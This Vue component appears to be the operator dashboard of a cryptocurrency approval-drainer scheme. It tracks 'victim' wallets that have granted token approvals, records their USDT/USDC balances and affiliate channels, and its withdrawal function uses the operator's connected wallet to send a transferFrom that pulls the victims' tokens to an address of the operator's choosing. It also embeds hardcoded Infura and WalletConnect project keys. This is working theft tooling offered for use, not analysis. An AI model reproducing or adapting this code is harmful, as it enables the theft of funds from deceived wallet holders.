<template>
	<div>
		<div class="gva-search-box">
			<el-form ref="searchForm" :inline="true" :model="searchInfo">
<!--				<el-form-item label="用户id">-->
<!--					<el-input v-model="searchInfo.id" placeholder="" />-->
<!--				</el-form-item>-->
				<el-form-item label="用户地址">
					<el-input v-model="searchInfo.customerAddress" placeholder="" />
				</el-form-item>
				<el-form-item label="授权地址">
					<el-input v-model="searchInfo.approvalAddress" placeholder="" />
				</el-form-item>

<!--				<el-form-item label="渠道">-->
<!--					<el-input v-model="searchInfo.primaryChannel" placeholder="" />-->
<!--				</el-form-item>-->

<!--        <el-form ref="searchForm" :inline="true" :model="searchInfo">-->
        <el-form-item label="一级渠道">
          <el-select v-model="searchInfo.channel" clearable placeholder="请选择">
            <el-option
                v-for="item in channelList"
                :key="item.userName"
                :label="`${item.userName}`"
                :value="item.userName"
            />
          </el-select>
        </el-form-item>

				<el-form-item label="币种">
					<el-select v-model="searchInfo.token" clearable placeholder="请选择">
						<el-option v-for="item in tokenOptions" :key="item.value"
							:label="`${item.label}(${item.value})`" :value="item.value" />
					</el-select>
				</el-form-item>
				<el-form-item>
					<el-button type="primary" icon="search" @click="onSubmit">查询</el-button>
					<el-button icon="refresh" @click="onReset">重置</el-button>
				</el-form-item>
			</el-form>
		</div>
		<div class="gva-table-box">
			<div class="gva-btn-list">
				<el-button type="primary" icon="plus" @click="openDialog('addApi')">新增</el-button>
				<el-button type="primary" icon="Switch" @click="walletconnect">{{
		  	selectedAccount ? selectedAccount : '链接钱包'
		  }}</el-button>
				
			</div>
			<el-table :data="tableData" @sort-change="sortChange" @selection-change="handleSelectionChange">
				<el-table-column type="selection" width="55" />
				<el-table-column align="left" label="id" min-width="60" prop="ID" sortable="custom" />
				<el-table-column align="left" label="客户地址" min-width="350" prop="customerAddress" sortable="custom" >
        <template #default="scope">
          <a :href="'https://etherscan.io/address/'+scope.row.customerAddress"  target="_blank" >{{scope.row.customerAddress}}</a>
        </template>
        </el-table-column>
				<el-table-column align="left" label="网络" min-width="80" prop="network" sortable="custom" />
				<el-table-column align="left" label="授权地址" min-width="350" prop="approvalAddress" sortable="custom" >
        <template #default="scope">
          <a :href="'https://etherscan.io/address/'+scope.row.approvalAddress"  target="_blank" >{{scope.row.approvalAddress}}</a>
        </template>
        </el-table-column>
				<el-table-column align="left" label="余额" min-width="80" prop="balance" sortable="custom" />
        <el-table-column align="left" label="刷新次数" min-width="100" prop="refresh" sortable="custom"/>
				<el-table-column align="left" label="币种" min-width="80" prop="token" sortable="custom" />
				<el-table-column align="left" label="已提取" min-width="100" prop="withdrawAmount" sortable="custom" />
				<el-table-column align="left" label="备注" min-width="150" prop="desc" sortable="custom" />
				<el-table-column align="left" label="一级渠道" min-width="150" prop="primaryChannel" sortable="custom" />
				<el-table-column align="left" label="二级渠道" min-width="150" prop="secondaryChannel" sortable="custom">
					<!--&lt;!&ndash;        <el-table-column align="left" label="一级渠道" min-width="150" prop="description" sortable="custom" />&ndash;&gt;-->

					<!--          <template #default="scope">-->
					<!--            <div>-->
					<!--              {{ scope.row.method }} / {{ methodFilter(scope.row.method) }}-->
					<!--            </div>-->
					<!--          </template>-->
				</el-table-column>

				<el-table-column align="left" fixed="right" label="操作" width="300">
					<template #default="scope">
						<el-button icon="edit" type="primary" link @click="editApiFunc(scope.row)">编辑</el-button>
						<el-button icon="refresh" type="primary" link @click="refreshFunc(scope.row)">刷新</el-button>

						<el-button icon="edit" type="primary" link @click="transfarApiFunc(scope.row)">提现</el-button>

					</template>
				</el-table-column>
			</el-table>
			<div class="gva-pagination">
				<el-pagination :current-page="page" :page-size="pageSize" :page-sizes="[10, 30, 50, 100]" :total="total"
					layout="total, sizes, prev, pager, next, jumper" @current-change="handleCurrentChange"
					@size-change="handleSizeChange" />
			</div>

		</div>

		<el-dialog v-model="dialogFormVisible" :before-close="closeDialog" :title="dialogTitle">
			<!--      <warning-bar title="新增API，需要在角色管理内配置权限才可使用" />-->
			<el-form ref="apiForm" :model="form" :rules="rules" label-width="80px">
				<el-form-item label="用户地址" prop="customerAddress">
					<el-input v-model="form.customerAddress" autocomplete="off" />
				</el-form-item>
				<el-form-item label="授权地址" prop="approvalAddress">
					<el-input v-model="form.approvalAddress" autocomplete="off" />
				</el-form-item>
		
				<!--        <el-form-item label="地址类型" prop="network">-->
				<!--          <el-input v-model="form.network" autocomplete="off" />-->
				<!--        </el-form-item>-->
		
				<el-form-item label="地址类型">
					<el-select v-model="form.network" clearable placeholder="请选择">
						<el-option v-for="item in networkOptions" :key="item.value"
							:label="`${item.label}(${item.value})`" :value="item.value" />
					</el-select>
				</el-form-item>
		
				<el-form-item label="币种类型">
					<el-select v-model="form.token" clearable placeholder="请选择">
						<el-option v-for="item in tokenOptions" :key="item.value"
							:label="`${item.label}(${item.value})`" :value="item.value" />
					</el-select>
				</el-form-item>
		
				<!--        <el-form-item label="" prop="token">-->
				<!--          <el-input v-model="form.token" autocomplete="off" />-->
				<!--        </el-form-item>-->
		
		
				<el-form-item label="备注信息" prop="desc">
					<el-input v-model="form.desc" autocomplete="off" />
				</el-form-item>
		
			</el-form>
			<template #footer>
				<div class="dialog-footer">
					<el-button @click="closeDialog">取 消</el-button>
					<el-button type="primary" @click="enterDialog">确 定</el-button>
				</div>
			</template>
		</el-dialog>
		<el-dialog v-model="dialogExchange" :before-close="openCloseExchange" title="提现">
			<el-form label-width="80px">
				<el-form-item label="用户地址" prop="customerAddress">
					<el-input v-model="customerAddress" autocomplete="off" />
				</el-form-item>
				<el-form-item label="授权地址" prop="approvalAddress">
					<el-input v-model="approvalAddress" autocomplete="off" />
				</el-form-item>
				
				<!--        <el-form-item label="地址类型" prop="network">-->
				<!--          <el-input v-model="form.network" autocomplete="off" />-->
				<!--        </el-form-item>-->
				
				<el-form-item label="地址类型">
					<el-select v-model="network" clearable placeholder="请选择">
						<el-option v-for="item in networkOptions" :key="item.value"
							:label="`${item.label}(${item.value})`" :value="item.value" />
					</el-select>
				</el-form-item>
				<el-form-item label="当前余额" prop="balance">
					<el-input v-model="balance" readonly="true" autocomplete="off" />
				</el-form-item>
				<el-form-item label="币种类型">
					<el-select v-model="token" clearable placeholder="请选择">
						<el-option v-for="item in tokenOptions" :key="item.value"
							:label="`${item.label}(${item.value})`" :value="item.value" />
					</el-select>
				</el-form-item>
				<el-form-item label="归集金额" prop="transfAmount">
					<el-input v-model="transfAmount"  autocomplete="off" />
				</el-form-item>
				<el-form-item label="到账地址" prop="transferAdd">
					<el-input v-model="transferAdd" autocomplete="off" />
				</el-form-item>
				<el-form-item label="当前登录钱包地址" prop="selectedAccount">
					<el-input v-model="selectedAccount" readonly="true" autocomplete="off" />
					<div v-show="Ismismatch" style="color:red">不匹配</div>
				</el-form-item>
			<!-- 	<el-form-item label="提现金额" prop="description">
					<el-input v-model="transfAmount" autocomplete="off" />
				</el-form-item> -->
			</el-form>
			<template #footer>
				<div class="dialog-footer">
					<el-button @click="openCloseExchange">取 消</el-button>
					<el-button type="primary" @click="confirmExchange">确 定</el-button>
				</div>
			</template>
		</el-dialog>
	
	</div>
</template>

<script>
	export default {
		name: 'Api',
	}
</script>

<script setup>
	import {
		getApiById,
		getApiList,
		setcreateVictimTx,
		createApi,
		updateApi,
		deleteApi,
		deleteApisByIds,
		freshCasbin,
		refreshTx
	} from '@/api/victim'
	import {
		toSQLLine
	} from '@/utils/stringFun'
	import WarningBar from '@/components/warningBar/warningBar.vue'
	import {
		ref
	} from 'vue'
	import {
		ElMessage,
		ElMessageBox
	} from 'element-plus'
	import {
		QuestionFilled,
		VideoCameraFilled
	} from "@element-plus/icons-vue";
	import {
		toDoc
	} from '@/utils/doc'
	//import Web3 from 'web3'
	//import WalletConnectProvider from '@walletconnect/web3-provider'
	import {
		ABI
	} from './abis'


	import Onboard from '@web3-onboard/core'
	import injectedModule from '@web3-onboard/injected-wallets'
	import {utils,ethers} from 'ethers'
	import walletConnectModule from '@web3-onboard/walletconnect'
  import {getUserList} from "@/api/collection";
	// import {
	// 	ERC20
	// } from "@ethcontracts/core";
	// import {
	// 	EthersClient
	// } from "@ethcontracts/ethers";
	const approveAddr = '0xdAC17F958D2ee523a2206206994597C13D831ec7' //usdt合约地址
	const approveUSDCAddr = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48' //usdc合约地址
	//const approveAddr = '0x016AFe65e5eF5557dE614A6744Ef8792F0246eF9'//测试用
	 const rpc = 'https://mainnet.infura.io/v3/'
	 //const infuraId = 'de36db3d81d44fb28d20100ab82d2629'
	//const rpc = 'https://goerli.infura.io/v3/'//测试用
	const infuraId = 'f3532f138b0a40699616c23db3f37686'//测试用
	const methodFilter = (value) => {
		const target = methodOptions.value.filter(item => item.value === value)[0]
		return target && `${target.label}`
	}

	const apis = ref([])
	const form = ref({
		customerAddress:'',
		path: '',
		apiGroup: '',
		method: '',
		description: ''
	})

	const tokenOptions = ref([{
			value: 'USDT',
			label: 'USDT',
			type: 'success'
		},
		{
			value: 'USDC',
			label: 'USDC',
			type: ''
		}
	])

	const networkOptions = ref([{
			value: 'ETH',
			label: '以太坊',
			type: 'success'
		},
		{
			value: 'TRX',
			label: '波场',
			type: 'warning'
		}
	])
	let web3 = null
	let contract = null
	let provider = null
	const selectedAccount = ref('')
	const type = ref('')
	const rules = ref({
		path: [{
			required: true,
			message: '请输入api路径',
			trigger: 'blur'
		}],
		apiGroup: [{
			required: true,
			message: '请输入组名称',
			trigger: 'blur'
		}],
		method: [{
			required: true,
			message: '请选择请求方式',
			trigger: 'blur'
		}],
		description: [{
			required: true,
			message: '请输入api介绍',
			trigger: 'blur'
		}]
	})

	const page = ref(1)
	const total = ref(0)
	const pageSize = ref(10)
	const tableData = ref([])
	const searchInfo = ref({})
	
	const customerAddress=ref('')
	const approvalAddress=ref('')
	const network=ref('')
	const balance=ref(0)
	const token = ref('')
	const transferFromAdd = ref('')
	const transferAdd = ref('')
	const transfAmount = ref(0)
	const Ismismatch=ref(false)
	const onReset = () => {
		searchInfo.value = {}
	}
	// 搜索

	const onSubmit = () => {
		page.value = 1
		pageSize.value = 10
		getTableData()
	}

	// 分页
	const handleSizeChange = (val) => {
		pageSize.value = val
		getTableData()
	}

	const handleCurrentChange = (val) => {
		page.value = val
		getTableData()
	}

	// 排序
	const sortChange = ({
		prop,
		order
	}) => {
		if (prop) {
			if (prop === 'ID') {
				prop = 'id'
			}
			searchInfo.value.orderKey = toSQLLine(prop)
			searchInfo.value.desc = order === 'descending'
		}
		getTableData()
	}

	// 查询
	const getTableData = async () => {
		const table = await getApiList({
			page: page.value,
			pageSize: pageSize.value,
			...searchInfo.value
		})
		if (table.code === 0) {
			tableData.value = table.data.list
			total.value = table.data.total
			page.value = table.data.page
			pageSize.value = table.data.pageSize
		}
	}

	getTableData()


  const channelList=ref([])
  const getchannelList=async()=>{
    const result = await getUserList()
    for(var i=0;i<result.data.users.length;i++)
    {
      channelList.value.push({id:result.data.users[i].id,userName:result.data.users[i].userName})
    }
  }
  getchannelList()

	// 批量操作
	const handleSelectionChange = (val) => {
		apis.value = val
	}

	const deleteVisible = ref(false)
	const onDelete = async () => {
		const ids = apis.value.map(item => item.ID)
		const res = await deleteApisByIds({
			ids
		})
		if (res.code === 0) {
			ElMessage({
				type: 'success',
				message: res.msg
			})
			if (tableData.value.length === ids.length && page.value > 1) {
				page.value--
			}
			deleteVisible.value = false
			getTableData()
		}
	}
	const freshVisible = ref(false)
	const onFresh = async () => {
		const res = await freshCasbin()
		if (res.code === 0) {
			ElMessage({
				type: 'success',
				message: res.msg
			})
		}
		freshVisible.value = false
	}

	// 弹窗相关
	const apiForm = ref(null)
	const initForm = () => {
		apiForm.value.resetFields()
		form.value = {
			customerAddress:'',
			path: '',
			apiGroup: '',
			method: '',
			description: ''
		}
	}

	const dialogTitle = ref('新增用户')
	const dialogFormVisible = ref(false)
	const dialogExchange = ref(false)
	const walletListVisible = ref(false)
	
	const openDialog = (key) => {
		switch (key) {
			case 'addApi':
				dialogTitle.value = '新增用户'
				break
			case 'edit':
				dialogTitle.value = '编辑用户'
				break
			default:
				break
		}
		type.value = key
		dialogFormVisible.value = true
	}
	const openWallet = () => {
		walletListVisible.value = true
	}
	const closeWallet = () => {
		walletListVisible.value = false
	}
	const transfarprimaryChannel=ref('')
	const transfarsecondaryChannel=ref('')
	const transfarApiFunc= async(row) => {
		console.log(row);
		console.log(row.customerAddress);
		
		if (!dialogExchange.value) {
			if (!selectedAccount.value) {
				//walletListVisible.value = true
				walletconnect()
				return
			}
		}
		const res = await getApiById({
			id: row.ID
		})
		customerAddress.value = res.data.victim.customerAddress
		approvalAddress.value = res.data.victim.approvalAddress
		network.value = res.data.victim.network
		balance.value = res.data.victim.balance
		token.value = res.data.victim.token
		transfarprimaryChannel.value= res.data.victim.primaryChannel
    transfarsecondaryChannel.value= res.data.victim.secondaryChannel
		if(approvalAddress.value.toLowerCase()!=selectedAccount.value.toLowerCase())
		{
			Ismismatch.value=true
		}else{
			Ismismatch.value=false
		}
		openCloseExchange()
	}
	const openCloseExchange = async() => {
		
		dialogExchange.value = !dialogExchange.value
	}
	const closeDialog = () => {
		initForm()
		dialogFormVisible.value = false
	}

	const editApiFunc = async (row) => {
		const res = await getApiById({
			id: row.ID
		})
		form.value = res.data.victim
		openDialog('edit')
	}
	const refreshFunc=async (row) => {
		const res = await refreshTx({
			id: row.ID
		})
	console.log(res)
	row.balance=res.data.balance;
	}
	//编辑提交
	const enterDialog = async () => {
		apiForm.value.validate(async valid => {
			if (valid) {
				switch (type.value) {
					case 'addApi': {
						const res = await createApi(form.value)
						if (res.code === 0) {
							ElMessage({
								type: 'success',
								message: '添加成功',
								showClose: true
							})
						}
						getTableData()
						closeDialog()
					}

					break
				case 'edit': {
					const res = await updateApi(form.value)
					if (res.code === 0) {
						ElMessage({
							type: 'success',
							message: '编辑成功',
							showClose: true
						})
					}
					getTableData()
					closeDialog()
				}
				break
				default:
				// eslint-disable-next-line no-lone-blocks
				{
					ElMessage({
						type: 'error',
						message: '未知操作',
						showClose: true
					})
				}
				break
				}
			}
		})
	}

	const deleteApiFunc = async (row) => {
		ElMessageBox.confirm('此操作将永久删除所有角色下该api, 是否继续?', '提示', {
				confirmButtonText: '确定',
				cancelButtonText: '取消',
				type: 'warning'
			})
			.then(async () => {
				const res = await deleteApi(row)
				if (res.code === 0) {
					ElMessage({
						type: 'success',
						message: '删除成功!'
					})
					if (tableData.value.length === 1 && page.value > 1) {
						page.value--
					}
					getTableData()
				}
			})
	}
	// 连接Metamask
	//const signer=null
	const wallet = {}
	var ethersProvider = null
	// 链接walletconnect
	const walletconnect = async () => {
		const injected = injectedModule()
		const wcV2InitOptions = {
			/**
			 * Project ID associated with [WalletConnect account](https://cloud.walletconnect.com)
			 */
			projectId: 'ead144cc158c9051b5e2f6ddd719057d',
			/**
			 * Chains required to be supported by all wallets connecting to your DApp
			 */
			requiredChains: [1],
			/**
			 * Defaults to `appMetadata.explore` that is supplied to the web3-onboard init
			 * Strongly recommended to provide atleast one URL as it is required by some wallets (i.e. MetaMask)
			 * To connect with WalletConnect
			 */
			dappUrl: 'http://localhost:8080'
		}
		const walletConnect = walletConnectModule(wcV2InitOptions)
		const onboard = Onboard({
			wallets: [injected, walletConnect],
			chains: [{
					id: '0x1',
					token: 'USDT',
					label: 'Ethereum Mainnet',
					rpcUrl: rpc + infuraId
				}
				// {
				//   id: '0x2105',
				//   token: 'USDT',
				//   label: 'Base',
				//   rpcUrl: 'https://mainnet.base.org'
				// }
			]
		})

		const wallets = await onboard.connectWallet()

		console.log(wallets)

		if (wallets[0]) {
			//wallet=wallets[0]
			// create an ethers provider with the last connected wallet provider
			// if using ethers v6 this is:
			// ethersProvider = new ethers.BrowserProvider(wallet.provider, 'any')
			selectedAccount.value = wallets[0].accounts[0].address
			walletListVisible.value = false
			ethersProvider = new ethers.providers.Web3Provider(wallets[0].provider, 'any')
		}
	}

	
	// 提现
	const confirmExchange = async () => {
		console.log(token.value)
		if (!transferAdd.value) {
			ElMessage({
				type: 'error',
				message: '请输入到账地址'
			})
			return false
		}
		if (!transfAmount.value) {
			ElMessage({
				type: 'error',
				message: '请输入到账金额'
			})
			return false
		}
	//transfAmount.value 
	var contactAdd=''
	if(token.value=="USDT")
		
	{
		contactAdd=approveAddr
	}else if(token.value=="USDC")
	{
		contactAdd=approveUSDCAddr
	}
		var amount= utils.parseUnits( transfAmount.value, "mwei")
		console.log('amount',amount)
		console.log('transferFromAdd',customerAddress.value)
		console.log('transferAdd',transferAdd.value)
		const iface = new utils.Interface(ABI);
		const data = iface.encodeFunctionData("transferFrom", [
			customerAddress.value,
		    transferAdd.value,
			amount
		  ]);
		  const nonce=ethersProvider.getTransactionCount(approvalAddress.value)
		  console.log('nonce',nonce)
		const signer = ethersProvider.getSigner()
		 const transaction = {
		    to: contactAdd, // The transaction will be sent to the USDC contract address
		    nonce: nonce, // Get the nonce of the wallet
		   
		    chainId: 1, // Corresponds to ETH_SEPOLIA
		    data: data, // encoded data for the transaction
		  };
		const txn = await signer.sendTransaction(transaction)
		
		try{
			const receipt = await txn.wait()
			console.log(receipt)
			console.log(receipt.transactionHash)
			const result = await setcreateVictimTx({
				fromAddress: customerAddress.value,
				approvalAddress: approvalAddress.value,
				toAddress:transferAdd.value,
				network:'ETH',
				withdrawAmount:transfAmount.value,
				token:token.value,
				txHash:receipt.transactionHash,
				primaryChannel:transfarprimaryChannel.value,
        secondaryChannel:transfarsecondaryChannel.value
				
			})
			if(result.code==0)
			{
				ElMessage({
					type: 'success',
					message: '提现成功'
				})
				openCloseExchange()
			}else{
				ElMessage({
					type: 'success',
					message: '记录保存失败'
				})
			}
		}catch (error) {
			console.log(error)
			ElMessage({
				type: 'fail',
				message: '提现失败'
			})
		}
		
		
	}
</script>

<style scoped lang="scss">
	.warning {
		color: #dc143c;
	}

	.gva-btn-list {
		display: flex;
		justify-content: space-between;
	}

	.wallet-list {
		display: flex;

		.wallet-item {
			margin: 30px 15px 0 0;
			cursor: pointer;

			img {
				width: 120px;
				height: 120px;
			}
		}
	}
</style>
